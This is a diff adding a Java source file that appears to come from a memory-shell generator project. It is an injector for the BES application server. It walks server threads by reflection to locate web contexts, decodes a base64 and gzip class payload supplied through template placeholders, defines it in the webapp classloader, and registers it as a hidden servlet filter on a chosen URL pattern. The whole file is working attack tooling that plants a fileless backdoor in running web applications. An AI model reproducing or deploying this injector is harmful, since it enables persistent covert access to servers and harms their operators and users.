@@ -1,0 +1,305 @@
+package com.reajason.javaweb.memshell.injector.bes;
+
+import javax.servlet.Filter;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.PrintStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.*;
+import java.util.zip.GZIPInputStream;
+
+/**
+ * BES RawWebSocket 注入器：在 Filter 注入的基础上先按
+ * {@code <shellClassName>$RawWsHelper} defineClass helper，再实例化 shell。
+ *
+ * @author ReaJason
+ */
+public class BesRawWsInjector {
+    private static String msg = "";
+    private static boolean ok = false;
+
+    public String getUrlPattern() {
+        return "{{urlPattern}}";
+    }
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() throws IOException {
+        return "{{base64Str}}";
+    }
+
+    public String getHelperBase64String() {
+        return "{{helperBase64Str}}";
+    }
+
+    public BesRawWsInjector() {
+        if (ok) {
+            return;
+        }
+        boolean injected = false;
+        Set<Object> contexts = null;
+        try {
+            contexts = getContext();
+        } catch (Throwable throwable) {
+            msg += "context error: " + getErrorMessage(throwable);
+        }
+        if (contexts == null || contexts.isEmpty()) {
+            msg += "context not found";
+        } else {
+            for (Object context : contexts) {
+                try {
+                    msg += ("context: [" + getContextRoot(context) + "] ");
+                    Object shell = getShell(context);
+                    inject(context, shell);
+                    msg += "[" + getUrlPattern() + "] ready\n";
+                    injected = true;
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
+                }
+            }
+        }
+        ok = injected;
+        System.out.println(msg);
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) getFieldValue(context, "encodedPath");
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
+    }
+
+    /**
+     * com.bes.enterprise.webtier.core.DefaultContext
+     * /opt/bes/lib/bes-engine.jar
+     */
+    public Set<Object> getContext() throws Exception {
+        Set<Object> contexts = new HashSet<Object>();
+        Set<Thread> threads = Thread.getAllStackTraces().keySet();
+        for (Thread thread : threads) {
+            try {
+                if (thread.getName().contains("ContainerBackgroundProcessor")) {
+                    Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
+                    for (Object value : childrenMap.values()) {
+                        contexts.addAll(((Map<?, ?>) getFieldValue(value, "children")).values());
+                    }
+                } else if (thread.getName().contains("AppServer-utility")) {
+                    // BES 10 / BES 11: AppServer-utility thread fallback.
+                    // BES 11 target has a wrappedRunnable field; BES 10 does not — try/catch handles both.
+                    Object target = getFieldValue(thread, "target");
+                    try {
+                        target = getFieldValue(target, "wrappedRunnable");
+                    } catch (Throwable ignored) {
+                    }
+                    Iterable<?> workQueue = (Iterable<?>) getFieldValue(getFieldValue(target, "this$0"), "workQueue");
+                    for (Object task : workQueue) {
+                        Object runnable = getFieldValue(getFieldValue(task, "callable"), "task");
+                        if (!runnable.getClass().getSimpleName().contains("ContainerBackgroundProcessor")) {
+                            continue;
+                        }
+                        Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(runnable, "this$0"), "children");
+                        for (Object host : childrenMap.values()) {
+                            contexts.addAll(((Map<?, ?>) getFieldValue(host, "children")).values());
+                        }
+                    }
+                } else if (thread.getContextClassLoader() != null) {
+                    String name = thread.getContextClassLoader().getClass().getSimpleName();
+                    if (name.matches(".+WebappClassLoader")) {
+                        Object resources = getFieldValue(thread.getContextClassLoader(), "resources");
+                        // need WebResourceRoot not DirContext
+                        if (resources != null && resources.getClass().getName().endsWith("Root")) {
+                            Object context = getFieldValue(resources, "context");
+                            contexts.add(context);
+                        }
+                    }
+                }
+            } catch (Throwable ignored) {
+                // JDK 17 下单个线程的反射目标可能不可达（如 Worker.this$0），
+                // 跳过它继续找其它入口，不能让一个线程终止整个发现流程
+            }
+        }
+        return contexts;
+    }
+
+    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            Object loader = invokeMethod(context, "getLoader", null, null);
+            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
+        }
+    }
+
+    @SuppressWarnings("all")
+    private Object getShell(Object context) throws Exception {
+        ClassLoader classLoader = getWebAppClassLoader(context);
+        defineHelper(classLoader);
+        Class<?> clazz = null;
+        try {
+            clazz = classLoader.loadClass(getClassName());
+        } catch (Exception e) {
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
+            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+            defineClass.setAccessible(true);
+            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
+        }
+        msg += "[" + classLoader.getClass().getName() + "] ";
+        return clazz.newInstance();
+    }
+
+    /**
+     * helper 必须先于 shell 构造完成 define；shell 无参构造会按类名自行解析它。
+     */
+    @SuppressWarnings("all")
+    private Class<?> defineHelper(ClassLoader classLoader) throws Exception {
+        String helperName = getClassName() + "$RawWsHelper";
+        try {
+            return classLoader.loadClass(helperName);
+        } catch (Throwable ignored) {
+        }
+        byte[] helperBytes = gzipDecompress(decodeBase64(getHelperBase64String()));
+        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass",
+                String.class, byte[].class, int.class, int.class);
+        defineClass.setAccessible(true);
+        return (Class<?>) defineClass.invoke(classLoader, helperName, helperBytes, 0, helperBytes.length);
+    }
+
+    @SuppressWarnings("unchecked")
+    public void inject(Object context, Object filter) throws Exception {
+        String filterName = getClassName();
+        if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
+            return;
+        }
+        ClassLoader contextClassLoader = context.getClass().getClassLoader();
+        Object filterDef = contextClassLoader.loadClass("com.bes.enterprise.web.util.descriptor.web.FilterDef").newInstance();
+        Object filterMap = contextClassLoader.loadClass("com.bes.enterprise.web.util.descriptor.web.FilterMap").newInstance();
+        invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
+        invokeMethod(filterDef, "setFilter", new Class[]{Filter.class}, new Object[]{filter});
+        invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
+        invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
+        invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
+        try {
+            invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
+        } catch (Exception e) {
+            invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
+        }
+
+        Constructor<?>[] constructors = contextClassLoader.loadClass("com.bes.enterprise.webtier.core.ApplicationFilterConfig").getDeclaredConstructors();
+        constructors[0].setAccessible(true);
+        Object filterConfig = constructors[0].newInstance(context, filterDef);
+        HashMap<String, Object> filterConfigs = (HashMap<String, Object>) getFieldValue(context, "filterConfigs");
+        filterConfigs.put(filterName, filterConfig);
+    }
+
+    @Override
+    public String toString() {
+        return msg;
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] decodeBase64(String base64Str) throws Exception {
+        Class<?> decoderClass;
+        try {
+            decoderClass = Class.forName("java.util.Base64");
+            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
+        } catch (Exception ignored) {
+            decoderClass = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
+        }
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        GZIPInputStream gzipInputStream = null;
+        try {
+            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
+            byte[] buffer = new byte[4096];
+            int n;
+            while ((n = gzipInputStream.read(buffer)) > 0) {
+                out.write(buffer, 0, n);
+            }
+            return out.toByteArray();
+        } finally {
+            if (gzipInputStream != null) {
+                gzipInputStream.close();
+            }
+            out.close();
+        }
+    }
+
+    @SuppressWarnings("all")
+    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
+        Field field = getField(obj, fieldName);
+        field.setAccessible(true);
+        return field.get(obj);
+    }
+
+    @SuppressWarnings("all")
+    public static Field getField(Object obj, String fieldName) throws NoSuchFieldException {
+        Class<?> clazz = obj.getClass();
+        while (clazz != null) {
+            try {
+                Field field = clazz.getDeclaredField(fieldName);
+                field.setAccessible(true);
+                return field;
+            } catch (NoSuchFieldException e) {
+                clazz = clazz.getSuperclass();
+            }
+        }
+        throw new NoSuchFieldException(fieldName);
+    }
+
+    @SuppressWarnings("all")
+    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
+        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
+        Method method = null;
+        while (clazz != null && method == null) {
+            try {
+                if (paramClazz == null) {
+                    method = clazz.getDeclaredMethod(methodName);
+                } else {
+                    method = clazz.getDeclaredMethod(methodName, paramClazz);
+                }
+            } catch (NoSuchMethodException e) {
+                clazz = clazz.getSuperclass();
+            }
+        }
+        if (method == null) {
+            throw new NoSuchMethodException("Method not found: " + methodName);
+        }
+        method.setAccessible(true);
+        return method.invoke(obj instanceof Class ? null : obj, param);
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
+    }
+}
